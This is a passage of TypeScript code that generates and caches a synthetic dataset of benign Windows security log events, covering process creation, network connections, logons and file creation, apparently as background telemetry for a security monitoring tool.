    const userObj = corporateUsers[Math.floor(rand() * corporateUsers.length)];
    // Random offset between 0 and 14,400,000 ms (4 hours)
    const offsetMs = Math.floor(rand() * 14400000);
    const timestamp = formatTime(offsetMs);
    const categoryRoll = rand();

    if (categoryRoll < 0.40) {
      // Process Creation Event (Sysmon 1 or Security 4688)
      const isSysmon = rand() > 0.3;
      const proc = benignProcessList[Math.floor(rand() * benignProcessList.length)];
      const pid = 1000 + Math.floor(rand() * 8000);
      const parentPid = 400 + Math.floor(rand() * 3000);
      const replacedCmd = proc.cmd.replace('{user}', userObj.username);
      const replacedPath = proc.path.replace('{user}', userObj.username);

      addEvent({
        id: nextId(),
        timestamp,
        event_source: isSysmon ? 'sysmon' : 'security',
        event_id: isSysmon ? 1 : 4688,
        event_category: 'process',
        severity: 'informational',
        host: { hostname: userObj.hostname, ip: userObj.ip },
        user: { username: userObj.username, domain: userObj.domain, is_admin: userObj.is_admin },
        process: {
          pid,
          name: proc.name,
          path: replacedPath,
          command_line: replacedCmd,
          parent_pid: parentPid,
          parent_name: 'explorer.exe',
          parent_command_line: 'C:\\Windows\\Explorer.EXE',
        },
        raw_message: `Process Create (ID ${isSysmon ? 1 : 4688}): New process ${proc.name} (PID: ${pid}) launched on ${userObj.hostname} by ${userObj.domain}\\${userObj.username}.`,
      });
    } else if (categoryRoll < 0.70) {
      // Network Event (Sysmon 3 or Firewall)
      const target = benignDomains[Math.floor(rand() * benignDomains.length)];
      const srcPort = 49152 + Math.floor(rand() * 15000);
      const isFirewall = rand() > 0.8;

      addEvent({
        id: nextId(),
        timestamp,
        event_source: isFirewall ? 'firewall' : 'sysmon',
        event_id: isFirewall ? 1001 : 3,
        event_category: 'network',
        severity: 'informational',
        host: { hostname: userObj.hostname, ip: userObj.ip },
        user: { username: userObj.username, domain: userObj.domain },
        process: {
          pid: 2000 + Math.floor(rand() * 4000),
          name: target.domain.includes('google') ? 'chrome.exe' : (target.domain.includes('slack') ? 'slack.exe' : 'svchost.exe'),
          path: 'C:\\Windows\\System32\\svchost.exe',
          command_line: 'C:\\Windows\\System32\\svchost.exe',
        },
        network: {
          protocol: 'tcp',
          src_ip: userObj.ip,
          src_port: srcPort,
          dest_ip: target.ip,
          dest_port: target.port,
          dest_hostname: target.domain,
          direction: target.ip.startsWith('10.') ? 'internal' : 'outbound',
        },
        raw_message: `Network Connection (ID ${isFirewall ? 1001 : 3}): ${userObj.hostname} (${userObj.ip}:${srcPort}) -> ${target.domain} (${target.ip}:${target.port}).`,
      });
    } else if (categoryRoll < 0.88) {
      // Authentication Event (Security 4624 / 4634)
      const isLogon = rand() > 0.2;
      const logonType = rand() > 0.6 ? 3 : 2; // Network vs Interactive

      addEvent({
        id: nextId(),
        timestamp,
        event_source: 'security',
        event_id: isLogon ? 4624 : 4634,
        event_category: 'authentication',
        severity: 'informational',
        host: { hostname: userObj.hostname, ip: userObj.ip },
        user: { username: userObj.username, domain: userObj.domain, is_admin: userObj.is_admin },
        raw_message: isLogon
          ? `An account was successfully logged on. Logon Type: ${logonType}. User: ${userObj.domain}\\${userObj.username}. Host: ${userObj.hostname}.`
          : `An account was logged off. User: ${userObj.domain}\\${userObj.username}. Host: ${userObj.hostname}.`,
      });
    } else {
      // File Action Event (Sysmon 11)
      const fileName = benignFileNames[Math.floor(rand() * benignFileNames.length)];
      const filePath = `C:\\Users\\${userObj.username}\\AppData\\Local\\Temp\\${fileName}`;

      addEvent({
        id: nextId(),
        timestamp,
        event_source: 'sysmon',
        event_id: 11,
        event_category: 'file',
        severity: 'informational',
        host: { hostname: userObj.hostname, ip: userObj.ip },
        user: { username: userObj.username, domain: userObj.domain },
        process: {
          pid: 1488,
          name: 'explorer.exe',
          path: 'C:\\Windows\\Explorer.EXE',
          command_line: 'C:\\Windows\\Explorer.EXE',
        },
        file: {
          path: filePath,
          name: fileName,
          action: 'created',
          hashes: {
            sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
          },
        },
        raw_message: `File Created (Sysmon ID 11): TargetFilename: ${filePath} by user ${userObj.username}.`,
      });
    }
  }

  // Sort chronologically by timestamp
  events.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());

  return events;
}

// Singleton cached dataset
let cachedDataset: NormalizedLogEvent[] | null = null;

export function getTelemetryDataset(): NormalizedLogEvent[] {
  if (!cachedDataset) {
    cachedDataset = generateTelemetryDataset();
  }
  return cachedDataset;
}
